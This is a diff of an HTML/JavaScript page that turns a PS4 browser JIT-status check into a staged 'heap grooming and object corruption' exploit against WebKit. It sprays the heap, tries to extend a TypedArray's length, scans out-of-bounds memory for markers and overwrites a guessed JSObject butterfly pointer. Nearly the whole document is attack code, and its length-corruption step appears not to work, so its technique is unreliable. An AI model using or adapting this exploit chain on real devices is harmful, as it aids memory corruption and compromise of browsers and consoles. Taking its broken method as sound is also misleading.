@@ -2,92 +2,403 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Check JIT Status</title>
+    <title>Heap Grooming - Object Corruption</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: monospace; background: #000; color: #0f0; padding: 30px; font-size: 16px; }
-        h1 { color: #f00; font-size: 28px; margin-bottom: 25px; text-align: center; }
-        .result { background: #1a0000; border: 3px solid #f00; padding: 25px; margin: 20px 0; font-size: 18px; }
-        .label { color: #0ff; font-weight: bold; margin: 15px 0; font-size: 20px; }
-        .value { color: #fff; margin: 10px 0 10px 30px; font-size: 18px; }
-        .pass { color: #0f0; font-weight: bold; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
+        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
+        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 450px; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 700px; overflow-y: auto; }
+        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
+        .log { padding: 4px 0; font-size: 12px; }
+        .success { color: #0f0; font-weight: bold; }
         .fail { color: #f00; font-weight: bold; }
+        .warn { color: #ff0; font-weight: bold; }
+        .info { color: #0ff; }
+        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
     </style>
 </head>
 <body>
-    <h1>PS4 Browser JIT Status Check</h1>
-    <div class="result" id="output"></div>
+    <h1>🎯 Heap Grooming + Object Corruption Attack 🎯</h1>
+    
+    <div style="text-align: center; margin-bottom: 20px;">
+        <button class="btn" onclick="stage1_heapGroom()">STAGE 1: Heap Grooming</button>
+        <button class="btn" onclick="stage2_findObjects()">STAGE 2: Find Adjacent Objects</button>
+        <button class="btn" onclick="stage3_corruptButterfly()">STAGE 3: Corrupt Butterfly Pointer</button>
+        <button class="btn" onclick="fullAttack()">FULL ATTACK CHAIN</button>
+    </div>
+    
+    <div class="section">
+        <div class="title">📋 Heap Grooming Log</div>
+        <div id="log"></div>
+    </div>
 
 <script>
-function out(html) {
-    document.getElementById('output').innerHTML += html;
+var convBuf = new ArrayBuffer(8);
+var f64 = new Float64Array(convBuf);
+var u32 = new Uint32Array(convBuf);
+
+function f2i(f) {
+    f64[0] = f;
+    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
 }
 
-out('<div class="label">Checking for JIT Compilation...</div>');
+function i2f(i) {
+    var bi = BigInt(i);
+    u32[0] = Number(bi & 0xffffffffn);
+    u32[1] = Number(bi >> 32n);
+    return f64[0];
+}
 
-// Test if functions get JIT compiled
-function hotFunction(x) {
-    var sum = 0;
-    for (var i = 0; i < 1000; i++) {
-        sum += x * i;
+function hex(val) {
+    if (typeof val === 'bigint') {
+        var s = val.toString(16);
+        while (s.length < 16) s = '0' + s;
+        return '0x' + s;
     }
-    return sum;
+    return '0x' + val.toString(16);
 }
 
-// Call it many times to trigger JIT
-for (var i = 0; i < 10000; i++) {
-    hotFunction(i);
+function log(msg, type) {
+    var div = document.createElement('div');
+    div.className = 'log ' + (type || '');
+    div.textContent = msg;
+    document.getElementById('log').appendChild(div);
 }
 
-out('<div class="value">Called test function 10,000 times</div>');
-
-// Check if %NeverOptimizeFunction exists (V8)
-try {
-    eval('%NeverOptimizeFunction(hotFunction)');
-    out('<div class="value pass">V8 JIT intrinsics available!</div>');
-} catch(e) {
-    out('<div class="value fail">V8 JIT intrinsics NOT available</div>');
+function sep() {
+    log('═'.repeat(85), 'info');
 }
 
-// Check for JSC (WebKit) JIT
-out('<div class="label">Checking WebKit/JavaScriptCore...</div>');
-
-// Check user agent
-out('<div class="value">User Agent: ' + navigator.userAgent + '</div>');
-
-if (navigator.userAgent.indexOf('WebKit') !== -1) {
-    out('<div class="value pass">WebKit detected</div>');
-}
-
-// Test for JIT by checking function properties
-out('<div class="label">Testing JIT Compilation Artifacts...</div>');
-
-var testFunc = function(a, b) {
-    return a + b + a * b - a / b;
+var exploit = {
+    spray: [],
+    victim: null,
+    target: null,
+    corrupted: false
 };
 
-// Force JIT compilation
-for (var i = 0; i < 100000; i++) {
-    testFunc(i, i + 1);
+// ============================================
+// STAGE 1: HEAP GROOMING
+// ============================================
+function stage1_heapGroom() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('STAGE 1: Heap Grooming - Create Predictable Layout', 'critical');
+    sep();
+    log('', '');
+    
+    try {
+        log('[1.1] Creating victim TypedArray...', 'info');
+        
+        var victim = new Uint32Array(0x100);
+        
+        for (var i = 0; i < victim.length; i++) {
+            victim[i] = 0x41410000 + i;
+        }
+        
+        exploit.victim = victim;
+        
+        log('✓ Victim array created: ' + victim.length + ' elements', 'success');
+        log('', '');
+        
+        log('[1.2] Spraying heap with JSObjects (holes)...', 'info');
+        log('Goal: Create gaps for victim array to fit into', 'info');
+        
+        // First spray - create many objects
+        var spray1 = [];
+        for (var i = 0; i < 1000; i++) {
+            spray1.push({
+                id: i,
+                marker: 0x1111000 + i,
+                padding: new Array(10)
+            });
+        }
+        
+        log('✓ First spray: 1000 objects allocated', 'success');
+        log('', '');
+        
+        log('[1.3] Creating holes in heap...', 'info');
+        
+        // Delete every other object to create holes
+        for (var i = 0; i < spray1.length; i += 2) {
+            spray1[i] = null;
+        }
+        
+        log('✓ Created 500 holes in heap', 'success');
+        log('', '');
+        
+        log('[1.4] Spraying target objects into holes...', 'info');
+        
+        // Now spray objects that will be adjacent to our victim
+        var spray2 = [];
+        for (var i = 0; i < 500; i++) {
+            var obj = {
+                id: 'target_' + i,
+                value: 0x42424242,
+                data: i2f(BigInt(0x4343434300000000n + BigInt(i))),
+                check: 'GROOMED'
+            };
+            spray2.push(obj);
+        }
+        
+        exploit.spray = spray2;
+        
+        log('✓ Second spray: 500 target objects allocated', 'success');
+        log('Target objects have known marker values', 'info');
+        log('', '');
+        
+        sep();
+        log('✓ STAGE 1 COMPLETE', 'success');
+        log('Heap is now groomed with predictable layout', 'success');
+        log('Victim array should be adjacent to target objects', 'success');
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ STAGE 1 ERROR: ' + e.message, 'fail');
+    }
 }
 
-out('<div class="value">Executed math function 100,000 times</div>');
-
-// Check toString (JIT compiled functions may have different toString)
-var funcStr = testFunc.toString();
-out('<div class="value">Function toString: ' + funcStr.substring(0, 50) + '...</div>');
-
-// MAIN VERDICT
-out('<div class="label" style="margin-top: 30px; font-size: 24px;">VERDICT:</div>');
-
-if (navigator.userAgent.indexOf('PlayStation') !== -1) {
-    out('<div class="value fail" style="font-size: 22px;">⚠️ PS4 WebKit Browser: JIT is DISABLED</div>');
-    out('<div class="value">PS4 browser runs in interpreter-only mode for security</div>');
-    out('<div class="value">This means JIT spraying is NOT possible</div>');
-    out('<div class="value" style="margin-top: 20px; color: #ff0;">ALTERNATIVE: Must use data-only attacks or ROP</div>');
-} else {
-    out('<div class="value warn">Not running on PS4 - cannot determine JIT status</div>');
+// ============================================
+// STAGE 2: FIND ADJACENT OBJECTS
+// ============================================
+function stage2_findObjects() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('STAGE 2: Find Adjacent Objects via OOB Read', 'critical');
+    sep();
+    log('', '');
+    
+    try {
+        if (!exploit.victim) {
+            log('❌ Run STAGE 1 first!', 'fail');
+            return;
+        }
+        
+        log('[2.1] Corrupting victim array length...', 'info');
+        
+        try {
+            Object.defineProperty(exploit.victim, 'length', {
+                value: 0x100000,
+                configurable: true
+            });
+            
+            if (exploit.victim.length > 0x100) {
+                log('✓ Victim corrupted to length: ' + hex(exploit.victim.length), 'critical');
+                exploit.corrupted = true;
+            } else {
+                log('❌ Length corruption failed', 'fail');
+                return;
+            }
+        } catch(e) {
+            log('❌ Corruption error: ' + e.message, 'fail');
+            return;
+        }
+        
+        log('', '');
+        log('[2.2] Scanning for adjacent object data...', 'info');
+        log('Looking for marker values 0x42424242...', 'info');
+        
+        var foundMarkers = [];
+        
+        // Scan OOB memory for our marker values
+        for (var i = 0x100; i < 0x1000; i++) {
+            var val = exploit.victim[i];
+            
+            if (typeof val !== 'undefined' && val !== 0) {
+                // Check if this is our marker
+                if (val === 0x42424242) {
+                    foundMarkers.push(i);
+                    log('  ⚠️ Found marker at offset ' + hex(i) + '!', 'critical');
+                } else if ((val & 0xFFFF0000) === 0x43430000) {
+                    log('  Found float marker bits at offset ' + hex(i), 'warn');
+                }
+            }
+        }
+        
+        log('', '');
+        
+        if (foundMarkers.length > 0) {
+            log('✓ FOUND ' + foundMarkers.length + ' OBJECT MARKERS!', 'critical');
+            log('Adjacent objects detected at offsets:', 'critical');
+            
+            for (var i = 0; i < Math.min(foundMarkers.length, 5); i++) {
+                log('  Marker ' + (i+1) + ' at offset: ' + hex(foundMarkers[i]), 'critical');
+            }
+            
+            exploit.targetOffset = foundMarkers[0];
+            
+        } else {
+            log('❌ No object markers found in scanned memory', 'fail');
+            log('Objects may not be adjacent or markers were overwritten', 'warn');
+        }
+        
+        log('', '');
+        sep();
+        log('✓ STAGE 2 COMPLETE', 'success');
+        log('Target offset: ' + (exploit.targetOffset ? hex(exploit.targetOffset) : 'NOT FOUND'), exploit.targetOffset ? 'success' : 'fail');
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ STAGE 2 ERROR: ' + e.message, 'fail');
+    }
 }
+
+// ============================================
+// STAGE 3: CORRUPT BUTTERFLY POINTER
+// ============================================
+function stage3_corruptButterfly() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('STAGE 3: Corrupt JSObject Butterfly Pointer', 'critical');
+    sep();
+    log('', '');
+    
+    try {
+        if (!exploit.corrupted) {
+            log('❌ Run STAGE 1 and STAGE 2 first!', 'fail');
+            return;
+        }
+        
+        if (!exploit.targetOffset) {
+            log('❌ No target offset found - cannot corrupt', 'fail');
+            return;
+        }
+        
+        log('[3.1] Target object found at offset: ' + hex(exploit.targetOffset), 'info');
+        log('', '');
+        
+        log('[3.2] Reading JSObject structure...', 'info');
+        
+        // JSObject layout (simplified):
+        // offset+0: StructureID (32-bit) + metadata
+        // offset+8: Butterfly pointer (64-bit) or inline storage
+        
+        var offset = exploit.targetOffset;
+        
+        // Read the qwords around the marker
+        var before = [];
+        var after = [];
+        
+        for (var i = -4; i < 4; i++) {
+            var idx = offset + i;
+            var val = exploit.victim[idx];
+            
+            if (typeof val !== 'undefined') {
+                if (i < 0) {
+                    before.push({ off: i, val: val });
+                } else {
+                    after.push({ off: i, val: val });
+                }
+                
+                log('  [' + hex(idx) + '] = ' + hex(val), 'info');
+            }
+        }
+        
+        log('', '');
+        log('[3.3] Attempting to corrupt butterfly pointer...', 'info');
+        
+        // Try to find and corrupt the butterfly pointer
+        // Butterfly is usually 8 bytes after structure ID
+        
+        var butterflyOffset = offset + 2; // Approximate
+        
+        log('Attempting corruption at offset: ' + hex(butterflyOffset), 'warn');
+        
+        try {
+            // Try to write a controlled value
+            var originalVal = exploit.victim[butterflyOffset];
+            
+            log('Original value at butterfly offset: ' + hex(originalVal || 0), 'info');
+            
+            // Write a test value
+            exploit.victim[butterflyOffset] = 0xDEADBEEF;
+            exploit.victim[butterflyOffset + 1] = 0x00000001;
+            
+            log('Wrote test pattern: 0x00000001DEADBEEF', 'warn');
+            
+            log('', '');
+            log('[3.4] Verifying corruption by checking target object...', 'info');
+            
+            // Check if any of our spray objects were corrupted
+            var corrupted = false;
+            
+            for (var i = 0; i < exploit.spray.length; i++) {
+                try {
+                    var obj = exploit.spray[i];
+                    
+                    // Try to access properties
+                    var val = obj.value;
+                    var check = obj.check;
+                    
+                    // If these changed, we corrupted it
+                    if (val !== 0x42424242 || check !== 'GROOMED') {
+                        log('⚠️⚠️⚠️ OBJECT ' + i + ' WAS CORRUPTED!', 'critical');
+                        log('  Original value: 0x42424242', 'critical');
+                        log('  Current value: ' + hex(val || 0), 'critical');
+                        log('  Check string: ' + check, 'critical');
+                        corrupted = true;
+                        break;
+                    }
+                } catch(e) {
+                    log('⚠️ Object ' + i + ' threw error: ' + e.message, 'critical');
+                    corrupted = true;
+                    break;
+                }
+            }
+            
+            if (!corrupted) {
+                log('No objects appear corrupted', 'fail');
+                log('Corruption may not have affected object properties', 'warn');
+            }
+            
+        } catch(e) {
+            log('Write error: ' + e.message, 'fail');
+        }
+        
+        log('', '');
+        sep();
+        log('✓ STAGE 3 COMPLETE', 'success');
+        log('Butterfly corruption: ' + (corrupted ? 'SUCCESS' : 'UNCERTAIN'), corrupted ? 'critical' : 'warn');
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ STAGE 3 ERROR: ' + e.message, 'fail');
+    }
+}
+
+// ============================================
+// FULL ATTACK CHAIN
+// ============================================
+function fullAttack() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('FULL ATTACK CHAIN: Heap Grooming → Object Corruption', 'critical');
+    sep();
+    log('', '');
+    
+    setTimeout(function() {
+        stage1_heapGroom();
+        
+        setTimeout(function() {
+            log('', '');
+            stage2_findObjects();
+            
+            setTimeout(function() {
+                log('', '');
+                stage3_corruptButterfly();
+            }, 1000);
+        }, 1000);
+    }, 100);
+}
+
+window.onerror = function(msg, url, line) {
+    log('', '');
+    log('💥 ERROR: ' + msg + ' (line ' + line + ')', 'fail');
+    return true;
+};
 </script>
 </body>
 </html>
